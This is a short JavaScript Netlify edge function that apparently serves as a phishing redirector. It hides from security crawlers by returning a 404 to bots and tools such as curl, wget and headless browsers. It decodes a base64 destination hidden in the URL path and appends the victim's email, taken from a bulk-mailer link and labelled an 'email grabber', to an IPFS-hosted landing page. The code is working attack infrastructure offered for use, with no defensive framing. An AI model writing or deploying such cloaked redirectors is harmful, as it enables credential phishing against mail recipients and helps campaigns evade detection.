export default async (request, context) => {
  const url = new URL(request.url);
  const userAgent = (request.headers.get("user-agent") || "").toLowerCase();
  
  // 1. BOT CHECK (Unchanged)
  const botKeywords = ["googlebot", "bingbot", "python", "curl", "wget", "headless"];
  if (botKeywords.some(bot => userAgent.includes(bot))) {
    return new Response('404 Not Found', { status: 404 });
  }

  // 2. CAPTURE THE EMAIL PARAMETER FROM GAMMADYNE
  // Gammadyne hits Netlify with: .../path?email=user@domain.com
  const emailParam = url.searchParams.get("email");

  // 3. EXTRACTION & REDIRECT
  const parts = url.pathname.split(".");
  const base64Data = parts.length > 1 ? parts.pop() : null;

  if (base64Data && base64Data.length > 10) {
    try {
      const normalized = base64Data.replace(/-/g, '+').replace(/_/g, '/').trim();
      let decodedUrl = atob(normalized);
      
      if (decodedUrl.startsWith("http")) {
        // IMPORTANT: Attach the email grabber to the final IPFS URL
        if (emailParam) {
          // Check if decodedUrl already has a ? or not
          const separator = decodedUrl.includes("?") ? "&" : "?";
          decodedUrl = `${decodedUrl}${separator}email=${encodeURIComponent(emailParam)}`;
        }

        console.log("Redirecting to:", decodedUrl);
        return Response.redirect(decodedUrl, 302);
      }
    } catch (e) {
      console.log("Base64 Decode Failed");
    }
  }

  return new Response('404 Not Found', { status: 404 });
};

export const config = { path: "/*" };
